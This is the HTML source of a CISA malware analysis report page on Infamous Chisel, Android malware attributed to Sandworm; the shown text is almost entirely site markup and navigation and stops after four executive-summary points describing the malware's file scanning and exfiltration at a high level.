

<!DOCTYPE html>
<html lang="en" dir="ltr" prefix="og: https://ogp.me/ns#" class="no-js">
  <head>
    <meta charset="utf-8" />
<link rel="canonical" href="https://www.cisa.gov/news-events/analysis-reports/ar23-243a" />
<meta property="og:site_name" content="Cybersecurity and Infrastructure Security Agency CISA" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://www.cisa.gov/news-events/analysis-reports/ar23-243a" />
<meta property="og:title" content="Infamous Chisel Malware Analysis Report | CISA" />
<meta name="Generator" content="Drupal 10 (https://www.drupal.org)" />
<meta name="MobileOptimized" content="width" />
<meta name="HandheldFriendly" content="true" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" href="/profiles/cisad8_gov/themes/custom/gesso/favicon.png" type="image/png" />

    <title>Infamous Chisel Malware Analysis Report | CISA</title>
    <link rel="stylesheet" media="all" href="/core/modules/system/css/components/align.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/fieldgroup.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/container-inline.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/clearfix.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/details.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/hidden.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/item-list.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/js.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/nowrap.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/position-container.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/reset-appearance.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/resize.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/system-status-counter.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/system-status-report-counters.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/system-status-report-general-info.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/tablesort.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/misc/components/progress.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/misc/components/ajax-progress.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/core/modules/views/css/views.module.css?sltso8" />
<link rel="stylesheet" media="all" href="/modules/contrib/responsive_tables_filter/css/tablesaw-base.css?sltso8" />
<link rel="stylesheet" media="screen" href="/modules/contrib/responsive_tables_filter/css/tablesaw-responsive.css?sltso8" />
<link rel="stylesheet" media="all" href="/modules/contrib/responsive_tables_filter/css/tables.columntoggle.css?sltso8" />
<link rel="stylesheet" media="all" href="/modules/contrib/responsive_tables_filter/css/customizations.css?sltso8" />
<link rel="stylesheet" media="all" href="/profiles/cisad8_gov/modules/custom/toolbar_tasks/css/toolbar.css?sltso8" />
<link rel="stylesheet" media="all" href="/modules/contrib/extlink/extlink.css?sltso8" />
<link rel="stylesheet" media="all" href="/modules/contrib/ckeditor_accordion/css/accordion.frontend.css?sltso8" />
<link rel="stylesheet" media="all" href="/modules/contrib/better_social_sharing_buttons/css/better_social_sharing_buttons.css?sltso8" />
<link rel="stylesheet" media="all" href="/modules/contrib/paragraphs/css/paragraphs.unpublished.css?sltso8" />
<link rel="stylesheet" media="all" href="//fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&amp;family=Public+Sans:wght@400;500;600;700&amp;display=swap" />
<link rel="stylesheet" media="all" href="/profiles/cisad8_gov/themes/custom/gesso/dist/css/styles.css?sltso8" />

    <script type="application/json" data-drupal-selector="drupal-settings-json">{"path":{"baseUrl":"\/","pathPrefix":"","currentPath":"node\/18713","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"en"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"gtm":{"tagId":null,"settings":{"data_layer":"dataLayer","include_classes":false,"allowlist_classes":"","blocklist_classes":"","include_environment":false,"environment_id":"","environment_token":""},"tagIds":["GTM-53QLXSL9"]},"gtag":{"tagId":"","consentMode":false,"otherIds":[],"events":[],"additionalConfigInfo":[]},"ajaxPageState":{"libraries":"eJxdj2tuxCAMhC9EwpGQAYfQOBhhk2xuX7ab3ar9M_I38ms8qmJzwiEDOVmh5ZKc76pcxIpeNNiEDWNWbg5C4BYzF_up5qVxUSzR4ENH92Zj6xVovtEk5kToFJJNQ_7zDF_w-GvuJnU5o9glE77rROyBTIUGqUFd5X3n15l7qd1TlhWjaSh1ZMjHc6snFDe2jaz2RXBOLzZyieJuPQgaZSYPbUzIJvYm02XBmPhw95dQgC7NQSwxxOmDU4jFHBlPsT867xw74TcJwYxD","theme":"guswds","theme_token":null},"ajaxTrustedUrl":[],"data":{"extlink":{"extTarget":false,"extTargetNoOverride":false,"extNofollow":false,"extNoreferrer":false,"extFollowNoOverride":false,"extClass":"ext","extLabel":"(link is external)","extImgClass":false,"extSubdomains":true,"extExclude":"(.\\.gov$)|(.\\.mil$)|(.\\.mil\/)|(.\\.gov\/)","extInclude":"","extCssExclude":".c-menu--social,.c-menu--footer,.c-social-links,.c-text-cta--button,.usa-footer__contact-info","extCssExplicit":"","extAlert":true,"extAlertText":"You are now leaving an official website of the United State Government (USG), the Department of Homeland Security (DHS) and the Cybersecurity and Infrastructure Security Agency (CISA). Links to non-USG, non-DHS and non-CISA sites are provided for the visitor\u0027s convenience and do not represent an endorsement by USG, DHS or CISA of any commercial or private issues, products or services. Note that the privacy policy of the linked site may differ from that of USG, DHS and CISA.","mailtoClass":"mailto","mailtoLabel":"(link sends email)","extUseFontAwesome":false,"extIconPlacement":"append","extFaLinkClasses":"fa fa-external-link","extFaMailtoClasses":"fa fa-envelope-o","whitelistedDomains":[]}},"ckeditorAccordion":{"accordionStyle":{"collapseAll":1,"keepRowsOpen":0,"animateAccordionOpenAndClose":1,"openTabsWithHash":1}},"user":{"uid":0,"permissionsHash":"0f75d40308887aebba0d5b0d2671305b73c9431902f86e672380a6dc6ab97d07"}}</script>
<script src="/core/assets/vendor/jquery/jquery.min.js?v=3.7.1"></script>
<script src="/core/assets/vendor/once/once.min.js?v=1.0.1"></script>
<script src="/core/misc/drupalSettingsLoader.js?v=10.3.5"></script>
<script src="/core/misc/drupal.js?v=10.3.5"></script>
<script src="/core/misc/drupal.init.js?v=10.3.5"></script>
<script src="/core/assets/vendor/tabbable/index.umd.min.js?v=6.2.0"></script>
<script src="/modules/contrib/google_tag/js/gtm.js?sltso8"></script>
<script src="/modules/contrib/google_tag/js/gtag.js?sltso8"></script>
<script src="/core/misc/progress.js?v=10.3.5"></script>
<script src="/core/assets/vendor/loadjs/loadjs.min.js?v=4.3.0"></script>
<script src="/core/misc/debounce.js?v=10.3.5"></script>
<script src="/core/misc/announce.js?v=10.3.5"></script>
<script src="/core/misc/message.js?v=10.3.5"></script>
<script src="/core/misc/ajax.js?v=10.3.5"></script>
<script src="/modules/contrib/google_tag/js/gtag.ajax.js?sltso8"></script>

  </head>
  <body  class="path-node not-front node-page node-page--node-type-advisory" id="top">
    
<div  class="c-skiplinks">
  <a href="#main" class="c-skiplinks__link u-visually-hidden u-focusable">Skip to main content</a>
</div>
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-53QLXSL9"
                  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

      <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
    

<div  class="l-site-container">
    
      
<section  class="usa-banner" aria-label="Official government website">
  <div class="usa-accordion">  <header class="usa-banner__header">
    <div class="usa-banner__inner">
      <div class="grid-col-auto">
        <img class="usa-banner__header-flag" src="/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png" alt="U.S. flag" />
      </div>
      <div class="grid-col-fill tablet:grid-col-auto">
        <p class="usa-banner__header-text">An official website of the United States government</p>
              <p class="usa-banner__header-action" aria-hidden="true">Here’s how you know</p></div>
        <button class="usa-accordion__button usa-banner__button" aria-expanded="false" aria-controls="gov-banner">
          <span class="usa-banner__button-text">Here’s how you know</span>
        </button>
          </div>
  </header>
      <div class="usa-banner__content usa-accordion__content" id="gov-banner">
      <div class="grid-row grid-gap-lg">
                  <div class="usa-banner__guidance tablet:grid-col-6">
            <img class="usa-banner__icon usa-media-block__img" src="/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg" alt="Dot gov">
            <div class="usa-media-block__body">
              <p>
                <strong>Official websites use .gov</strong>
                <br> A <strong>.gov</strong> website belongs to an official government organization in the United States.
              </p>
            </div>
          </div>
                  <div class="usa-banner__guidance tablet:grid-col-6">
            <img class="usa-banner__icon usa-media-block__img" src="/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg" alt="HTTPS">
            <div class="usa-media-block__body">
              <p>
                <strong>Secure .gov websites use HTTPS</strong>
                <br> A <strong>lock</strong> (<span class="icon-lock"><svg xmlns="http://www.w3.org/2000/svg" width="52" height="64" viewBox="0 0 52 64" class="usa-banner__lock-image" role="img" aria-labelledby="banner-lock-title banner-lock-description"><title id="banner-lock-title">Lock</title><desc id="banner-lock-description">A locked padlock</desc><path fill="#000000" fill-rule="evenodd" d="M26 0c10.493 0 19 8.507 19 19v9h3a4 4 0 0 1 4 4v28a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V32a4 4 0 0 1 4-4h3v-9C7 8.507 15.507 0 26 0zm0 8c-5.979 0-10.843 4.77-10.996 10.712L15 19v9h22v-9c0-6.075-4.925-11-11-11z"/></svg></span>) or <strong>https://</strong> means you’ve safely connected to the .gov website. Share sensitive information only on official, secure websites.
              </p>
            </div>
          </div>
              </div>
    </div>
  </div>
  </section>
  



  <div  class="c-block c-global-header-btns c-global-btns">

      <div  class="l-constrain l-constrain">
  
  
    

      <div  class="c-block__content">
  
      





  <div  id="block-globalbuttons" class="c-block c-block--provider-block-content c-block--id-block-content83069f9f-34fc-4d54-86ec-936a204f8088">

  
  
    

      <div  class="c-block__content">
  
      




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><p><a class="c-button c-button--basic c-button--blue" href="/resources-tools/resources/free-cybersecurity-services-and-tools" title="Free Cyber Services">Free Cyber Services</a><a class="c-button c-button--basic c-button--gray" href="/protect2024">#protect2024</a><a class="c-button c-button--basic c-button--teal" href="/node/18883">Secure Our World</a><a class="c-button c-button--campaign" href="/node/8056">Shields Up</a><a class="c-button c-button--report" href="/report">Report A Cyber Issue</a></p></div></div>

  
      </div>
  
  
  </div>

  
      </div>
  
      </div>
  
  </div>
  
  


<div class="usa-overlay"></div>
<header  class="usa-header usa-header--extended" role="banner">
        
<div  class="usa-navbar">
  <div class="l-constrain">
    <div class="usa-navbar__row">
                                    



  <div  class="c-block c-site-header">

      <div  class="l-constrain">
  
  
    

      <div  class="c-block__content">
  
      





  <div  id="block-guswds-cisaheaderblock" class="c-block c-block--provider-block-content c-block--id-block-contentbc4e6844-86b4-4e20-b163-a73bda3d1d76">

  
  
    

      <div  class="c-block__content">
  
      




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><a href="/"><img src = "/sites/default/files/images/SVG/header_logo_tagline_update.svg" alt="CISA logo image. America's Cyber Defense Agency, National Coordinator for Critical Infrastructure Security and Resilience"/></a></div></div>

  
      </div>
  
  
  </div>

  
      </div>
  
      </div>
  
  </div>

        



  <div  class="c-block c-site-header-mobile">

      <div  class="l-constrain">
  
  
    

      <div  class="c-block__content">
  
      





  <div  id="block-guswds-cisaheaderblockmobile" class="c-block c-block--provider-block-content c-block--id-block-content283396c9-cd36-4ce3-b1e2-9b5576ab4f50">

  
  
    

      <div  class="c-block__content">
  
      




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><a href="/"><img src = "/sites/default/files/images/SVG/mobile_logo_wordmark.svg" alt="CISA Logo"/></a></div></div>

  
      </div>
  
  
  </div>

  
      </div>
  
      </div>
  
  </div>
            <div class="usa-navbar__search">
        <div class="usa-navbar__search-header">
          <p>Search</p>
        </div>
        
<div  class="usa-search">
  <script async src=https://cse.google.com/cse.js?cx=ffc4c79e29d5b3a8c></script>
  <div class="gcse-searchbox-only" data-resultsurl="/search">&nbsp;</div>
</div>
      </div>
      <button class="mobile-menu-button usa-menu-btn">Menu</button>
    </div>
  </div>
</div>
    



  <div  class="c-block c-tagline-mobile">

      <div  class="l-constrain">
  
  
    

      <div  class="c-block__content">
  
      





  <div  id="block-guswds-mobiletaglinecontainer" class="c-block c-block--provider-block-content c-block--id-block-contentc8d12e9d-7e48-4708-90c1-563609c4b566">

  
  
    

      <div  class="c-block__content">
  
      




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><p><center><img src = "/sites/default/files/images/SVG/header_tagline_mobile_update.svg" alt = "America's Cyber Defense Agency" /></center></div></div>

  
      </div>
  
  
  </div>

  
      </div>
  
      </div>
  
  </div>
    

<nav  class="usa-nav" role="navigation" aria-label="Primary navigation">
  <div class="usa-nav__inner l-constrain">
    <div class="usa-nav__row">
      <button class="usa-nav__close">Close</button>
      
<div  class="usa-search">
  <script async src=https://cse.google.com/cse.js?cx=ffc4c79e29d5b3a8c></script>
  <div class="gcse-searchbox-only" data-resultsurl="/search">&nbsp;</div>
</div>
                
  
          <ul class="usa-nav__primary usa-accordion">
    
    
              <li class="usa-nav__primary-item topics">
      
              <button class="usa-accordion__button usa-nav__link " aria-expanded="false" aria-controls="basic-mega-nav-section-1">
          <span>Topics</span>
        </button>
      
                
  
          <div id="basic-mega-nav-section-1" class="usa-nav__submenu usa-megamenu" hidden="">

              <div class="usa-megamenu__parent-link">
          <a href="/topics">Topics</a>
        </div>
              <div class="usa-megamenu__menu-items">
    
    
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/cybersecurity-best-practices">
          <span>Cybersecurity Best Practices</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/cyber-threats-and-advisories">
          <span>Cyber Threats and Advisories</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/critical-infrastructure-security-and-resilience">
          <span>Critical Infrastructure Security and Resilience</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/election-security">
          <span>Election Security</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/emergency-communications">
          <span>Emergency Communications</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/industrial-control-systems">
          <span>Industrial Control Systems</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/information-communications-technology-supply-chain-security">
          <span>Information and Communications Technology Supply Chain Security</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/partnerships-and-collaboration">
          <span>Partnerships and Collaboration</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/physical-security">
          <span>Physical Security</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/risk-management">
          <span>Risk Management</span>
        </a>
                  </div>
              
              </div>
          
            </div>
                          

<div  class="c-menu-feature-links">
      <div class="c-menu-feature-links__title">
      <a href="/audiences">        How can we help?
      </a>    </div>
        <div class="c-menu-feature-links__content"><a href="/topics/government">Government</a><a href="/topics/educational-institutions">Educational Institutions</a><a href="/topics/industry">Industry</a><a href="/topics/state-local-tribal-and-territorial">State, Local, Tribal, and Territorial</a><a href="/topics/individuals-and-families">Individuals and Families</a><a href="/topics/small-and-medium-businesses">Small and Medium Businesses</a><a href="/audiences/find-help-locally">Find Help Locally</a><a href="/audiences/faith-based-community">Faith-Based Community</a><a href="/audiences/executives">Executives</a><a href="/audiences/high-risk-communities">High-Risk Communities</a></div>
  </div>

              </div>
    
  
      
              </li>
          
              <li class="usa-nav__primary-item spotlight">
      
      
                      <a href="/spotlight" class="usa-nav__link" >
          <span>Spotlight</span>
        </a>
              
              </li>
          
              <li class="usa-nav__primary-item resources--tools">
      
              <button class="usa-accordion__button usa-nav__link " aria-expanded="false" aria-controls="basic-mega-nav-section-3">
          <span>Resources &amp; Tools</span>
        </button>
      
                
  
          <div id="basic-mega-nav-section-3" class="usa-nav__submenu usa-megamenu" hidden="">

              <div class="usa-megamenu__parent-link">
          <a href="/resources-tools">Resources &amp; Tools</a>
        </div>
              <div class="usa-megamenu__menu-items">
    
    
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/all-resources-tools">
          <span>All Resources &amp; Tools</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/services">
          <span>Services</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/programs">
          <span>Programs</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/resources">
          <span>Resources</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/training">
          <span>Training</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/groups">
          <span>Groups</span>
        </a>
                  </div>
              
              </div>
          
            </div>
                          
              </div>
    
  
      
              </li>
          
              <li class="usa-nav__primary-item news--events">
      
              <button class="usa-accordion__button usa-nav__link usa-current" aria-expanded="false" aria-controls="basic-mega-nav-section-4">
          <span>News &amp; Events</span>
        </button>
      
                
  
          <div id="basic-mega-nav-section-4" class="usa-nav__submenu usa-megamenu" hidden="">

              <div class="usa-megamenu__parent-link">
          <a href="/news-events">News &amp; Events</a>
        </div>
              <div class="usa-megamenu__menu-items">
    
    
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/news">
          <span>News</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/events">
          <span>Events</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/cybersecurity-advisories">
          <span>Cybersecurity Alerts &amp; Advisories</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/directives">
          <span>Directives</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/request-speaker">
          <span>Request a CISA Speaker</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/congressional-testimony">
          <span>Congressional Testimony</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/cisa-conferences">
          <span>CISA Conferences</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/cisa-live">
          <span>CISA Live!</span>
        </a>
                  </div>
              
              </div>
          
            </div>
                          
              </div>
    
  
      
              </li>
          
              <li class="usa-nav__primary-item careers">
      
              <button class="usa-accordion__button usa-nav__link " aria-expanded="false" aria-controls="basic-mega-nav-section-5">
          <span>Careers</span>
        </button>
      
                
  
          <div id="basic-mega-nav-section-5" class="usa-nav__submenu usa-megamenu" hidden="">

              <div class="usa-megamenu__parent-link">
          <a href="/careers">Careers</a>
        </div>
              <div class="usa-megamenu__menu-items">
    
    
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/careers/benefits-perks">
          <span>Benefits &amp; Perks</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/careers/hirevue-applicant-reasonable-accommodations-process">
          <span>HireVue Applicant Reasonable Accommodations Process</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/general-recruitment-and-hiring-faqs">
          <span>Hiring</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/careers/resume-application-tips">
          <span>Resume &amp; Application Tips</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/students-recent-graduates-employment-opportunities">
          <span>Students &amp; Recent Graduates</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/careers/veteran-and-military-spouse-employment-opportunities">
          <span>Veteran and Military Spouses</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/careers/work-cisa">
          <span>Work @ CISA</span>
        </a>
                  </div>
              
              </div>
          
            </div>
                          
              </div>
    
  
      
              </li>
          
              <li class="usa-nav__primary-item about">
      
              <button class="usa-accordion__button usa-nav__link " aria-expanded="false" aria-controls="basic-mega-nav-section-6">
          <span>About</span>
        </button>
      
                
  
          <div id="basic-mega-nav-section-6" class="usa-nav__submenu usa-megamenu" hidden="">

              <div class="usa-megamenu__parent-link">
          <a href="/about">About</a>
        </div>
              <div class="usa-megamenu__menu-items">
    
    
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/culture">
          <span>Culture</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/divisions-offices">
          <span>Divisions &amp; Offices</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/regions">
          <span>Regions</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/leadership">
          <span>Leadership</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/doing-business-cisa">
          <span>Doing Business with CISA</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/site-links">
          <span>Site Links</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/reporting-employee-and-contractor-misconduct">
          <span>Reporting Employee and Contractor Misconduct</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/cisa-github">
          <span>CISA GitHub</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/cisa-central">
          <span>CISA Central</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/2023YIR">
          <span>2023 Year In Review</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/contact-us">
          <span>Contact Us </span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/contact-us/subscribe-updates-cisa">
          <span>Subscribe</span>
        </a>
                  </div>
              
              </div>
          
            </div>
                          
              </div>
    
  
      
              </li>
          
    
      </ul>
    
  


            



  <div  class="c-block c-global-menu-btns c-global-btns">

  
  
    

      <div  class="c-block__content">
  
      





  <div  id="block-globalbuttons" class="c-block c-block--provider-block-content c-block--id-block-content83069f9f-34fc-4d54-86ec-936a204f8088">

  
  
    

      <div  class="c-block__content">
  
      




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><p><a class="c-button c-button--basic c-button--blue" href="/resources-tools/resources/free-cybersecurity-services-and-tools" title="Free Cyber Services">Free Cyber Services</a><a class="c-button c-button--basic c-button--gray" href="/protect2024">#protect2024</a><a class="c-button c-button--basic c-button--teal" href="/node/18883">Secure Our World</a><a class="c-button c-button--campaign" href="/node/8056">Shields Up</a><a class="c-button c-button--report" href="/report">Report A Cyber Issue</a></p></div></div>

  
      </div>
  
  
  </div>

  
      </div>
  
  
  </div>
    </div>
  </div>
</nav>
    </header>


  
  
  
<div  class="l-breadcrumb">
  <div class="l-constrain">
    <div class="l-breadcrumb__row">
      







  
  
    

  
              


<nav  aria-labelledby="breadcrumb-label" class="c-breadcrumb" role="navigation">
  <div class="l-constrain">
    <div
       id="breadcrumb-label" class="c-breadcrumb__title  u-visually-hidden">Breadcrumb</div>
    <ol class="c-breadcrumb__list">
              <li class="c-breadcrumb__item">
                      <a class="c-breadcrumb__link" href="/">Home</a>
                  </li>
              <li class="c-breadcrumb__item">
                      <a class="c-breadcrumb__link" href="/news-events">News & Events</a>
                  </li>
              <li class="c-breadcrumb__item">
                      <a class="c-breadcrumb__link" href="/news-events/cybersecurity-advisories">Cybersecurity Advisories</a>
                  </li>
              <li class="c-breadcrumb__item">
                      <a class="c-breadcrumb__link" href="/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A65">Analysis Report</a>
                  </li>
          </ol>
  </div>
</nav>

  
  
  
  






  <div  id="block-bettersocialsharingbuttons" class="c-block c-block--social-share c-block--provider-better-social-sharing-buttons c-block--id-social-sharing-buttons-block">

  
  
    

      <div  class="c-block__content">
  
      <div class="c-block__row">
      <span>Share:</span>
      

<div style="display: none"><link rel="preload" href="/modules/contrib/better_social_sharing_buttons/assets/dist/sprites/social-icons--no-color.svg" as="image" type="image/svg+xml" crossorigin="anonymous" /></div>

<div class="social-sharing-buttons">
                <a href="https://www.facebook.com/sharer/sharer.php?u=https://www.cisa.gov/news-events/analysis-reports/ar23-243a&amp;title=Infamous%20Chisel%20Malware%20Analysis%20Report" target="_blank" title="Share to Facebook" aria-label="Share to Facebook" class="social-sharing-buttons__button share-facebook" rel="noopener">
            <svg width="18px" height="18px" style="border-radius:3px;">
                <use href="/modules/contrib/better_social_sharing_buttons/assets/dist/sprites/social-icons--no-color.svg#facebook" />
            </svg>
        </a>
    
                <a href="https://twitter.com/intent/tweet?text=Infamous%20Chisel%20Malware%20Analysis%20Report+https://www.cisa.gov/news-events/analysis-reports/ar23-243a" target="_blank" title="Share to X" aria-label="Share to X" class="social-sharing-buttons__button share-x" rel="noopener">
            <svg width="18px" height="18px" style="border-radius:3px;">
                <use href="/modules/contrib/better_social_sharing_buttons/assets/dist/sprites/social-icons--no-color.svg#x" />
            </svg>
        </a>
    
        
        
        
                <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://www.cisa.gov/news-events/analysis-reports/ar23-243a" target="_blank" title="Share to Linkedin" aria-label="Share to Linkedin" class="social-sharing-buttons__button share-linkedin" rel="noopener">
            <svg width="18px" height="18px" style="border-radius:3px;">
                <use href="/modules/contrib/better_social_sharing_buttons/assets/dist/sprites/social-icons--no-color.svg#linkedin" />
            </svg>
        </a>
    
        
        
        
        
                <a href="mailto:?subject=Infamous%20Chisel%20Malware%20Analysis%20Report&amp;body=https://www.cisa.gov/news-events/analysis-reports/ar23-243a" title="Share to Email" aria-label="Share to Email" class="social-sharing-buttons__button share-email" target="_blank" rel="noopener">
            <svg width="18px" height="18px" style="border-radius:3px;">
                <use href="/modules/contrib/better_social_sharing_buttons/assets/dist/sprites/social-icons--no-color.svg#email" />
            </svg>
        </a>
    
        
    </div>

    </div>
  
      </div>
  
  
  </div>

    </div>
  </div>
</div>

  
  

  <main id="main" class="c-main" role="main" tabindex="-1">
        
      
    


<div  class="l-content">
          







  
  
    

  
            






<div  class="is-promoted l-full">
    <div class="l-full__header">
        
<div  class="c-page-title">
  <div class="c-page-title__inner l-constrain">
    <div class="c-page-title__row">
      <div class="c-page-title__content">
                  <div class="c-page-title__meta">Analysis Report</div>
                <h1 class="c-page-title__title">
<span>Infamous Chisel Malware Analysis Report</span>
</h1>
                                                          <div class="c-page-title__fields">  




<div  class="c-field c-field--name-field-release-date c-field--type-datetime c-field--label-above">
  <div  class="c-field__label">Release Date</div><div class="c-field__content"><time datetime="2023-08-31T12:00:00Z">August 31, 2023</time></div></div>

  




<div  class="c-field c-field--name-field-alert-code c-field--type-string c-field--label-above">
  <div  class="c-field__label">Alert Code</div><div class="c-field__content">AR23-243A</div></div>

</div>
                        
        
      </div>
          </div>
    <div class="c-page-title__decoration"></div>
  </div>
</div>
    </div>
    <div class="l-full__main">
                      

<div  class="l-page-section l-page-section--rich-text">
      <div class="l-constrain">
  
  
  <div class="l-page-section__content">
          <h4>Infamous Chisel–A collection of components associated with Sandworm designed to enable remote access and exfiltrate information from Android phones.</h4>
<div>
<h2>Executive Summary</h2>
<ul>
<li>Infamous Chisel is a collection of components targeting Android devices.</li>
<li>This malware is associated with Sandworm activity.</li>
<li>It performs periodic scanning of files and network information for exfiltration.</li>
<li>System and application configuration files are exfiltrated from an infected device.</li>
